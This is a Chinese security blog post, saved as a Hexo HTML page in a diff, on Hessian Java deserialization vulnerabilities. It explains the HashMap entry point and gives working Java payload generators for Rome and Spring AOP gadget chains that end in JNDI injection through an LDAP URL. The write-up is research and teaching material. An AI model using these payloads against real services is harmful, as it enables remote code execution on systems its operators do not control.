@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>Hessian反序列化漏洞 - Twings</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期二, 七月 7日 2020, 11:19 上午
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.4k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      7 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 无。</p>
+<a id="more"></a>
+<hr>
+<h3 id="Hessian"><a href="#Hessian" class="headerlink" title="Hessian"></a>Hessian</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Hessian 是一个轻量级的 Java 反序列化框架，和 Java 原生的序列化类似，相比起来 Hessian 更加高效并且非常适合二进制数据传输。</p>
+<p>可以在 pom.xml 中加入依赖来使用 Hessian：</p>
+<pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;com.caucho&lt;/groupId&gt;
+    &lt;artifactId&gt;hessian&lt;/artifactId&gt;
+    &lt;version&gt;4.0.63&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>简单的序列化和反序列化代码，Data 是个简单的继承序列化接口的类：</p>
+<pre><code class="java">public class App {
+    public static void main( String[] args ) throws Exception {
+        Data data = new Data(&quot;Twings&quot;);
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        HessianOutput ho = new HessianOutput(bos);
+        ho.writeObject(data);
+        byte[] serializedData = bos.toByteArray();
+        ByteArrayInputStream is = new ByteArrayInputStream(serializedData);
+        HessianInput hi = new HessianInput(is);
+        hi.readObject();
+    }
+}
+</code></pre>
+<p>Hessian 不会调用序列化类的 readObject 方法，它会调用 readResolve 方法， 而这个方法一般是用在单例模式中的。</p>
+<p>Hessian 在恢复对象的属性的时候，不会调用该类的 setter，恢复方式是调用 _unsafe.putObject。</p>
+<p>Hessian 会将数据序列化为一个 Map，序列化之后的数据大致如下（URL 编码后）：</p>
+<pre><code>Mt%00%0Astudy.DataS%00%04dataS%00%06Twingsz
+</code></pre><h4 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h4><p>Hessian 反序列化同样存在漏洞，不过入口点与 Java 原生序列化的 readObject 方法不同，它的入口点在对 Map 类型反序列化处理时：</p>
+<pre><code class="java">public Object readMap(AbstractHessianInput in) throws IOException {
+    Map map;
+
+    if (_type == null)
+        map = new HashMap();
+    else if (_type.equals(Map.class))
+        map = new HashMap();
+    else if (_type.equals(SortedMap.class))
+        map = new TreeMap();
+    else {
+        try {
+            map = (Map) _ctor.newInstance();
+        } catch (Exception e) {
+            throw new IOExceptionWrapper(e);
+        }
+    }
+
+    in.addRef(map);
+
+    while (! in.isEnd()) {
+        map.put(in.readObject(), in.readObject());
+    }
+
+    in.readEnd();
+
+    return map;
+}
+</code></pre>
+<p>这里会调用 HashMap 的 put 方法，换而言之就是会调用 key 的 hashcode 方法，所以只要找到一条以 hashcode 开始的利用链，就可以完成一次 Hessian 反序列化攻击。</p>
+<p>marshalsec 工具中已经集成了 Hessian 的 5 个 Gadgets，可以使用这个工具直接进行漏洞利用。</p>
+<p>不过这个工具的生成流程着实比较复杂，看起来要麻烦一些。</p>
+<h3 id="Gadgets-Rome"><a href="#Gadgets-Rome" class="headerlink" title="Gadgets - Rome"></a>Gadgets - Rome</h3><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;com.rometools&lt;/groupId&gt;
+    &lt;artifactId&gt;rome&lt;/artifactId&gt;
+    &lt;version&gt;1.7.0&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.slf4j&lt;/groupId&gt;
+    &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt;
+    &lt;version&gt;1.7.24&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h4 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h4><ol>
+<li>HashMap，put -&gt; hash</li>
+<li>EqualsBean，hashCode -&gt; beanHashCode</li>
+<li>ToStringBean，toString -&gt; getter.invoke</li>
+<li>JdbcRowSetImpl，getDatabaseMetaData -&gt; connect</li>
+<li>JNDI 注入</li>
+</ol>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>可以仿照 apache-commons-collections 的 HashSet 这个 Gadget 的反射生成方式来生成 payload：</p>
+<pre><code class="java">private static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
+    Field field = obj.getClass().getDeclaredField(fieldName);
+    field.setAccessible(true);
+    field.set(obj, value);
+}
+
+private static Object getFieldValue(Object obj, String fieldName) throws NoSuchFieldException, IllegalAccessException {
+    Field field = obj.getClass().getDeclaredField(fieldName);
+    field.setAccessible(true);
+    return field.get(obj);
+}
+
+public static void main( String[] args ) throws Exception {
+    JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
+    jdbcRowSet.setDataSourceName(&quot;ldap://127.0.0.1:1389/Exploit&quot;);
+    ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);
+    EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
+
+    HashMap hashMap = new HashMap&lt;&gt;(1);
+    hashMap.put(&quot;replacement&quot;, &quot;Twings&quot;);
+    Object[] hashMapTable = (Object[])getFieldValue(hashMap, &quot;table&quot;);
+    Object hashMapNode = hashMapTable[1];
+    setFieldValue(hashMapNode, &quot;key&quot;, equalsBean);
+
+    ByteArrayOutputStream bos = new ByteArrayOutputStream();
+    HessianOutput ho = new HessianOutput(bos);
+    ho.writeObject(hashMap);
+    byte[] serializedData = bos.toByteArray();
+    ByteArrayInputStream is = new ByteArrayInputStream(serializedData);
+    HessianInput hi = new HessianInput(is);
+    System.out.println(java.net.URLEncoder.encode(new String(serializedData)));
+    hi.readObject();
+}
+</code></pre>
+<h3 id="Gadges-SpringPartiallyComparableAdvisorHolder"><a href="#Gadges-SpringPartiallyComparableAdvisorHolder" class="headerlink" title="Gadges - SpringPartiallyComparableAdvisorHolder"></a>Gadges - SpringPartiallyComparableAdvisorHolder</h3><h4 id="依赖-1"><a href="#依赖-1" class="headerlink" title="依赖"></a>依赖</h4><pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+    &lt;artifactId&gt;spring-aop&lt;/artifactId&gt;
+    &lt;version&gt;5.2.5.RELEASE&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.aspectj&lt;/groupId&gt;
+    &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt;
+    &lt;version&gt;1.9.2&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+    &lt;artifactId&gt;spring-context&lt;/artifactId&gt;
+    &lt;version&gt;5.2.5.RELEASE&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h4 id="利用链-1"><a href="#利用链-1" class="headerlink" title="利用链"></a>利用链</h4><ol>
+<li>HashMap，put -&gt; putVal -&gt; equals<br>这里需要 hash 冲突，所以选择两个相同的类</li>
+<li>HotSwappableTargetSource，equals -&gt; equals</li>
+<li>XString，equals -&gt; toString</li>
+<li>PartiallyComparableAdvisorHolder，toString -&gt; getOrder</li>
+<li>AspectJPointcutAdvisor，getOrder -&gt; getOrder</li>
+<li>AspectJAroundAdvice，getOrder -&gt; getOrder</li>
+<li>BeanFactoryAspectInstanceFactory，getOrder -&gt; getType</li>
+<li>SimpleJndiBeanFactory，getType -&gt; doGetType -&gt; doGetSingleton -&gt; lookup</li>
+<li>JNDI 注入</li>
+</ol>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里的生成比较复杂，反射赋值的时候需要从父类中获取 Field，还有则是序列化的时候需要设置允许不继承 Serializable 接口：</p>
+<pre><code class="java">package study;
+
+import com.caucho.hessian.io.SerializerFactory;
+
+public class AllowNonSerializableFactory extends SerializerFactory {
+
+}
+</code></pre>
+<p>测试代码：</p>
+<pre><code class="java">private static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
+    Field field = null;
+    try {
+        field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+    }catch ( NoSuchFieldException e ) {
+        if (!obj.getClass().getSuperclass().equals(Object.class)) {
+            field = obj.getClass().getSuperclass().getDeclaredField(fieldName);
+            field.setAccessible(true);
+        }
+    }
+    if (field != null) {
+        field.set(obj, value);
+    }
+}
+
+private static Object getFieldValue(Object obj, String fieldName) throws NoSuchFieldException, IllegalAccessException {
+    Field field = obj.getClass().getDeclaredField(fieldName);
+    field.setAccessible(true);
+    return field.get(obj);
+}
+
+private static Object createWithoutConstructor(Class clazz) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
+    Constructor constructor = Object.class.getDeclaredConstructor();
+    constructor.setAccessible(true);
+    Constructor ctor = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz, constructor);
+    return ctor.newInstance();
+}
+
+public static void main( String[] args ) throws Exception {
+
+    HashMap hashMap = new HashMap&lt;&gt;();
+    hashMap.put(&quot;replacement1&quot;, &quot;Twings&quot;);
+    hashMap.put(&quot;replacement2&quot;, &quot;Aluvion&quot;);
+
+    SimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory();
+
+    BeanFactoryAspectInstanceFactory beanFactoryAspectInstanceFactory = (BeanFactoryAspectInstanceFactory)createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
+    setFieldValue(beanFactoryAspectInstanceFactory, &quot;beanFactory&quot;, simpleJndiBeanFactory);
+    setFieldValue(beanFactoryAspectInstanceFactory, &quot;name&quot;, &quot;ldap://127.0.0.1:1389/Exploit&quot;);
+
+    AbstractAspectJAdvice aspectJAroundAdvice = (AbstractAspectJAdvice)createWithoutConstructor(AspectJAroundAdvice.class);
+    setFieldValue(aspectJAroundAdvice, &quot;aspectInstanceFactory&quot;, beanFactoryAspectInstanceFactory);
+
+    AspectJPointcutAdvisor aspectJPointcutAdvisor = (AspectJPointcutAdvisor)createWithoutConstructor(AspectJPointcutAdvisor.class);
+    setFieldValue(aspectJPointcutAdvisor, &quot;advice&quot;, aspectJAroundAdvice);
+
+    Object partiallyComparableAdvisorHolder = createWithoutConstructor(Class.forName(&quot;org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder&quot;));
+    setFieldValue(partiallyComparableAdvisorHolder, &quot;advisor&quot;, aspectJPointcutAdvisor);
+
+    HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(partiallyComparableAdvisorHolder);
+    HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString(&quot;rushB&quot;));
+    Object[] hashMapTable = (Object[])getFieldValue(hashMap, &quot;table&quot;);
+    Object hashMapNode0 = hashMapTable[5];
+    setFieldValue(hashMapNode0, &quot;key&quot;, hotSwappableTargetSource1);
+    Object hashMapNode1 = hashMapTable[10];
+    setFieldValue(hashMapNode1, &quot;key&quot;, hotSwappableTargetSource2);
+
+    ByteArrayOutputStream bos = new ByteArrayOutputStream();
+    HessianOutput ho = new HessianOutput(bos);
+    AllowNonSerializableFactory serializableFactory = new AllowNonSerializableFactory();
+    serializableFactory.setAllowNonSerializable(true);
+    ho.setSerializerFactory(serializableFactory);
+    ho.writeObject(hashMap);
+    byte[] serializedData = bos.toByteArray();
+    ByteArrayInputStream is = new ByteArrayInputStream(serializedData);
+    HessianInput hi = new HessianInput(is);
+    System.out.println(java.net.URLEncoder.encode(new String(serializedData)));
+    hi.readObject();
+}
+</code></pre>
+<h3 id="Gadgets-SpringAbstractBeanFactoryPointcutAdvisor"><a href="#Gadgets-SpringAbstractBeanFactoryPointcutAdvisor" class="headerlink" title="Gadgets - SpringAbstractBeanFactoryPointcutAdvisor"></a>Gadgets - SpringAbstractBeanFactoryPointcutAdvisor</h3><p>与上一条类似，触发 AbstractPointcutAdvisor 的 equals 方法，接上 SimpleJndiBeanFactory 的 getBean 然后进入 lookup，JNDI 注入。</p>
+<h3 id="Gadgets-其他两条"><a href="#Gadgets-其他两条" class="headerlink" title="Gadgets - 其他两条"></a>Gadgets - 其他两条</h3><p>懒得仔细看了，看起来比较简单。</p>
+<hr>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>尝试将 apache commons collections 的利用链修改后使用，结果发现 Map 的反序列化有点问题，利用失败。</p>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://docs.ioin.in/writeup/blog.csdn.net/_u011721501_article_details_79443598/index.html" target="_blank" rel="noopener">https://docs.ioin.in/writeup/blog.csdn.net/_u011721501_article_details_79443598/index.html</a></p>
+<p><a href="https://paper.seebug.org/1131" target="_blank" rel="noopener">https://paper.seebug.org/1131</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/07/02/MySQL-JDBC-客户端反序列化/">
+                        <span>MySQL JDBC 客户端反序列化</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Hessian反序列化漏洞&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
